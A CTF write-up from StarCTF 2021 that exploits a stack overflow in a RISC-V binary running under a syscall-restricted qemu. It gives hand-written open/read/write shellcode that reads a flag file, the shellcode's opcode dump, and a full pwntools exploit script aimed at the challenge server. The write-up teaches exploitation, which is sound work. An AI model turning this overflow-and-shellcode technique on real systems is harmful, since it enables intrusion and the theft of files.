---
title: Favourite Architecture-1 - StarCTF 2021
date: 2021-01-20 20:05:10
author: Pwn-Solo
author_url: https://twitter.com/Pwn_Solo
categories:
  - Pwn
tags:
  - Exploitation
  - RISC-V
  - Shellcode
  - Linux
  - StarCTF
---

**tl;dr**

+ Abusing a stack overflow on a RISC-V binary to then return to shellcode.

<!--more-->

**Challenge Points:** 465
**Solves:** 24
**Solved by:** [Pwn-Solo](https://twitter.com/Pwn_Solo) ,[d4rk_kn1gh7](https://twitter.com/_d4rkkn1gh7),[Cyb0rG](https://twitter.com/_Cyb0rG),[3agl3](https://twitter.com/3agl31)

## Initial Analysis 

This challenge is second in a 3 part series ,the first one being reversing and the rest pwn. This writeup involves only the challenge `favourite architecture flag1`

```
arch     riscv
baddr    0x10000
binsz    384184
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
laddr    0x0
lang     c
linenum  false
lsyms    false
machine  RISC V
nx       false
os       linux
```

A quick look in radare2 tells us that there's no canary and NX is disabled , but the qemu we had was patched to allow only certain syscalls 

``` c
+    switch (num) {
+        // syscall whitelist
+        case TARGET_NR_brk:
+        case TARGET_NR_uname:
+        case TARGET_NR_readlinkat:
+        case TARGET_NR_faccessat:
+        case TARGET_NR_openat2:
+        case TARGET_NR_openat:
+        case TARGET_NR_read:
+        case TARGET_NR_readv:
+        case TARGET_NR_write:
+        case TARGET_NR_writev:
+        case TARGET_NR_mmap:
+        case TARGET_NR_munmap:
+        case TARGET_NR_exit:
+        case TARGET_NR_exit_group:
+        case TARGET_NR_mprotect:
+            ret = do_syscall1(cpu_env, num, arg1, arg2, arg3, arg4,
+                    arg5, arg6, arg7, arg8);
+            break;
+        default:
+            printf("[!] %d bad system call\n", num);
+            ret = -1;
+            break;
+    }
```

## Debugging 

After spending hours finding a way to debug,I came across this [toolchain](http://shakti.org.in/learn_with_shakti/devenv.html) for RISC-V development which includes a gdb for RISC-V , pretty neat!

Reversing the binary isn't necessary for this part atleast. 
Triggering the bug is pretty straightforward, an input having length greater than 288 bytes gets you `pc` control (Instruction Pointer).
Since the qemu user doesn't have aslr enabled we dont have to worry about leaking stack 

## Shellcode 

Since there was a large overflow and with NX being disabled ,shellcode was the way to go .
unlike x86 , in RISC-V instructions are fixed in size ;32 or 16 bits to be precise. This needs to be taken into account while scripting the exploit.

The patched qemu disables execve syscall,but we do have `openat` `read` and `write` which is perfect , now we can construct an ORW shellcode to read the flag 

This was my first time coding assembly is RISC-V, after going through multiple [manuals](https://shakti.org.in/docs/risc-v-asm-manual.pdf) about the instruction-set I managed to write a half decent assembler code. To make a Syscall we make use of the `ecall` instruction and set the registers `a0-a7` accordingly. Also remember , the syscall numbers for RISC-V are quite different from x86 refer [syscall table](https://github.com/westerndigitalcorporation/RISC-V-Linux/blob/master/riscv-pk/pk/syscall.h)

```asm
_start:
    li s1, 0x67616c662f2f6e77
    sd s1, -16(sp)
    li s1, 0x702f2f656d6f682f
    sd s1, -24(sp)       
    sd zero, -8(sp)           
    addi a1,sp,-24                          
    slt a2,zero,-1              
    li a7, 56 	             
    ecall 

    addi a1,sp,-80
    li a2,60
    li a7, 63	
    ecall

    mv a2,a0
    li a0,1
    li a7, 64
    ecall
```

Compile and dump the opcodes
```asm
0000000000010078 <_start>:
   10078:	033b14b7          	lui	s1,0x33b1
   1007c:	b634849b          	addiw	s1,s1,-1181
   10080:	04b6                	slli	s1,s1,0xd
   10082:	62f48493          	addi	s1,s1,1583 # 33b162f <__global_pointer$+0x339fd4b>
   10086:	04b2                	slli	s1,s1,0xc
   10088:	2f748493          	addi	s1,s1,759
   1008c:	04b2                	slli	s1,s1,0xc
   1008e:	e7748493          	addi	s1,s1,-393
   10092:	fe913823          	sd	s1,-16(sp)
   10096:	038184b7          	lui	s1,0x3818
   1009a:	97b4849b          	addiw	s1,s1,-1669
   1009e:	04b6                	slli	s1,s1,0xd
   100a0:	56d48493          	addi	s1,s1,1389 # 381856d <__global_pointer$+0x3806c89>
   100a4:	04b2                	slli	s1,s1,0xc
   100a6:	6f748493          	addi	s1,s1,1783
   100aa:	04b2                	slli	s1,s1,0xc
   100ac:	82f48493          	addi	s1,s1,-2001
   100b0:	fe913423          	sd	s1,-24(sp)
   100b4:	fe013c23          	sd	zero,-8(sp)
   100b8:	fe810593          	addi	a1,sp,-24
   100bc:	fff02613          	slti	a2,zero,-1
   100c0:	03800893          	li	a7,56
   100c4:	00000073          	ecall
   100c8:	fb010593          	addi	a1,sp,-80
   100cc:	03c00613          	li	a2,60
   100d0:	03f00893          	li	a7,63
   100d4:	00000073          	ecall
   100d8:	862a                	mv	a2,a0
   100da:	4505                	li	a0,1
   100dc:	04000893          	li	a7,64
   100e0:	00000073          	ecall
```
## Exploit 

While constructing the shellcode the 32 bit and 16 bit instructions need to be packed differently or they wont be valid 

```python 
from pwn import *
import sys
import os

remote_ip,port = '119.28.89.167','60001'
binary = './qemu-riscv64  main'
#binary = './qemu-riscv64 -g 9001 main'
brkpts = ''

if sys.argv[1] == 'remote' :
    io = remote(remote_ip,port)
else:
    io = process(binary.split())

if __name__== "__main__":

    addr = 0x40007fff40
    nop = p32(0x00000013)
    sc = b''
    opcodes = ['0x033b14b7', '0xb634849b', '0x04b6', '0x62f48493', '0x04b2', '0x2f748493', '0x04b2', '0xe7748493', '0xfe913823', '0x038184b7', '0x97b4849b', '0x04b6', '0x56d48493', '0x04b2', '0x6f748493', '0x04b2', '0x82f48493', '0xfe913423', '0xfe013c23', '0xfe810593', '0xfff02613', '0x03800893', '0x00000073', '0xfb010593', '0x4651', '0x03f00893', '0x00000073', '0x862a', '0x4505', '0x04000893', '0x00000073']
    for i in opcodes:
        if len(i) == 6:
            sc += p16(int(i,16))
        else:
            sc += p32(int(i,16))

    payload = b''
    payload = payload.ljust(288,b"A") 
    payload += p64(addr)
    payload += nop*200 + sc
    io.sendlineafter('Input the flag: ',payload)
    resp = io.recvline()
    
    io.interactive()
		 
```
That's all there is to it!

lo and behold 
```bash
pwn-solo@m4ch1n3:~/ctf/favourite_architecture/share$ python3 exploit.py local
[+] Starting local process './qemu-riscv64': pid 19543
[*] Switching to interactive mode
flag{test_flag}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted

```
